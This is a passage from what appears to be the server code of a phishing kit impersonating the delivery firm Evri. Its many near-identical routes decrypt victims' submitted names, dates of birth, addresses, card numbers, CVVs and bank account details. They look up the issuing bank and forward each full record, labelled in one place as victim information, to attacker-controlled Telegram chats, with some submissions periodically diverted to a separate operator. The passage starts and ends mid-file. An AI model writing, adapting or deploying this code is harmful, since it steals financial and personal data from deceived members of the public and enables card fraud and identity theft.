          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        timesz = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTimesz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2032190159&text=Evri:\n${originalText}`
        );
        timesz += 1;
      }

      res.send("Update Completed");
    });
});

let TheOnlyMY = 2;

app.options("/TheOnlyMYEvri", cors());

app.post("/TheOnlyMYEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTheOnlyMY:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Evri:\n${originalText}`
        );
        TheOnlyMY += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/hoodsEvri", cors());

app.post("/hoodsEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Evri:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/flashEvri", cors());

app.post("/flashEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFlash:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-460917026&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

let aug24 = 0;

app.options("/haytchEvri", cors());

app.post("/haytchEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
      binInfo = resp.data;
    })
    .then(function () {
      var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
      if (aug24 == 1) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=EvriTriz:\n${originalText}`
          )
          .catch((e) => {
            console.log(e);
          });
        aug24 = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-609654810&text=EvriTriz:\n${originalText}`
          )
          .catch((e) => {
            console.log(e);
          });
        aug24 += 1;
      }
      res.send("Update Completed");
    });
});

let daanger = 0;

app.options("/dangerrEvri", cors());

app.post("/dangerrEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Evri:\n${originalText}`
        );
        daanger += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/cdbEvri", cors());

app.post("/cdbEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCDG:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/masonEvri", cors());

app.post("/masonEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=Evri:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

let manEvri = 5;

app.options("/mannymanEvri", cors());

app.post("/mannymanEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        manEvri = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=Evri:\n${originalText}`
        );
        manEvri += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/kelvEvri", cors());

app.post("/kelvEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Evri:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/fpaysEvri", cors());

app.post("/fpaysEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri2", cors());

app.post("/fpaysEvri2", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
        );
        fpaysC += 1;
      }
    });
});

app.options("/fpaysEvri3", cors());

app.post("/fpaysEvri3", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
